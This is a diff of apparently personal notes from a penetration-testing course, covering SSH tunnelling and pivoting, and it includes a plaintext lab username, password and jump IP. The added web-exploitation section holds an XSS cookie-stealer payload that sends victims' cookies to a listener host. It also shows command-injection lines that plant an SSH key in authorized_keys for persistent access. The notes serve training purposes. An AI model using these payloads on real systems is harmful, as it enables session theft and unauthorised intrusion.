@@ -1,6 +1,10 @@
+
+
 Stack Number    	Username	      Password	        jump
 11 	              NIPI-502-M 	    huhLIX9hZU6M 	    10.50.14.129
 
+
+==============================================================================================================================================================================================================================
 # Day 1 
 
 ## Test Overview
@@ -193,3 +197,43 @@ demo
 **ssh -S /tmp/t1file t1 -0 forward -D9050**
 
 -go through the enumeration again and repeat
+==============================================================================================================================================================================================================================
+
+
+
+DAY 2
+==============================================================================================================================================================================================================================
+WEB EXPLOITATION DAY 1
+
+ssh demo1@10.50.16.136 -L42070:10.208.50.42:80
+
+##Cookie Stealer
+script.document.location="http://10.50.187.53:4071/Cookie_Stealer1.php?username=" + document.cookie;</script>
+
+##From Remote IP (an IP you have access to), setup listener.
+nc -k -l <IP of machine> <port>.129::
+
+## SSH Key gen
+ssh-keygwn -t rsa -b 4096
+(press enter when prompted x3)
+
+###On website or remote location
+; mkdir /var/www/.ssh
+(make .ssh directory on users $HOME.
+; ls -la /var/www
+
+### Upload our key using cmd injection
+cat $HOME/.ssh/id_rsa.pub
+; echo "<paste whole .pub keys>" >> /var/www/.ssh/authorized_keys 
+; cat /var/www/.ssh/authorized_keys
+
+### Make ssh -MS connection to port
+ssh -MS /tmp/demo demo1@10.50.16.136
+ssh -S /tmp/demo ANYTHING -O forward -L42072:10.208.50.42:22
+
+#ssh
+ssh -i .ssh/id_rsa www-data@<ip>
+ssh -i .ssh/id_rsa www-data@127.0.0.1 -p 42072
+ssh -MS /tmp/t1 ssh -i .ssh/id_rsa www-data@127.0.0.1 -p 42072
+
+###Malicous File Upload
